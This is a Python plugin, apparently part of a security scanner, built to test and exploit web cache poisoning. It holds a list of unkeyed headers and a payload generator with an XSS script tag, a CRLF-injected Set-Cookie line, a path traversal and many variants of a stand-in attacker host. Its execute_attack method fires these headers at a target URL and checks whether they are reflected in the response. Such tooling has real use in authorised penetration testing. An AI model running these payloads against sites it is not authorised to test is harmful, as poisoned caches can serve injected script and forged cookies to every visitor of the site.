"""
Web Cache Poisoning Exploit Plugin

Provides exploit capabilities for web cache poisoning vulnerabilities:
- Unkeyed header injection (X-Forwarded-Host, X-Original-URL, etc.)
- Stored XSS via cache poisoning
- DoS via cache poisoning
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_ATTACKER_HOST = 'attacker.example.com'

_UNKEYED_HEADERS = [
    'X-Forwarded-Host',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Forwarded-Scheme',
    'X-Forwarded-For',
    'X-Host',
    'X-Forwarded-Server',
    'X-HTTP-Host-Override',
    'Forwarded',
    'X-Original-Host',
    'X-Real-IP',
    'True-Client-IP',
    'CF-Connecting-IP',
    'X-Client-IP',
    'X-Remote-IP',
    'X-Remote-Addr',
    'X-ProxyUser-Ip',
    'Via',
    'Client-IP',
    'Fastly-Client-IP',
]

_XSS_PAYLOAD = '<script>alert(document.domain)</script>'


class CachePoisoningPlugin(ExploitPlugin):
    """Web Cache Poisoning exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'cache_poisoning'

    @property
    def name(self) -> str:
        return 'Web Cache Poisoning Exploit'

    @property
    def description(self) -> str:
        return 'Web Cache Poisoning exploit: unkeyed header injection, stored XSS via cache.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return cache poisoning probe header values."""
        attacker = (context or {}).get('attacker_host', _ATTACKER_HOST)
        payloads = [attacker, _XSS_PAYLOAD, f'https://{attacker}/poison']
        # Add all unkeyed header names as probe payloads
        payloads.extend(_UNKEYED_HEADERS)
        # Add encoded and variant payloads
        payloads.extend([
            f'{attacker}:80',
            f'{attacker}:443',
            f'//{attacker}',
            f'http://{attacker}',
            f'https://{attacker}',
            f'{attacker}%2F',
            f'{attacker}%00',
            f'{attacker}\r\nSet-Cookie: poisoned=1',
            f'<script>alert(1)</script>.{attacker}',
            f'{attacker}/../../admin',
            f'{attacker};scheme=https',
            f'1;fwd="{attacker}"',
            f'for={attacker};proto=https;by=proxy',
            f'{attacker}, {attacker}',
            f'[{attacker}]',
            f'{attacker}:8080',
            f'https://{attacker}:443',
        ])
        return payloads

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Inject unkeyed headers and check whether the injected value is reflected in
        the response body (indicating the value flows to cached content).
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'cache_poisoning',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        attacker_host = config.get('attacker_host', _ATTACKER_HOST)

        for header_name in _UNKEYED_HEADERS:
            try:
                headers = {header_name: attacker_host}
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl)
                if attacker_host in resp.text:
                    return {
                        'success': True,
                        'vulnerability_type': 'cache_poisoning',
                        'injected_header': header_name,
                        'injected_value': attacker_host,
                        'evidence': (
                            f'Unkeyed header "{header_name}: {attacker_host}" reflected in response body â€” '
                            'cache poisoning may be possible'
                        ),
                        'message': 'Web cache poisoning confirmed via unkeyed header reflection',
                    }
            except Exception as e:
                logger.debug(f"Cache poisoning probe error ({header_name}): {e}")

        return {
            'success': False,
            'error': 'No cache poisoning vulnerability confirmed',
            'vulnerability_type': 'cache_poisoning',
        }
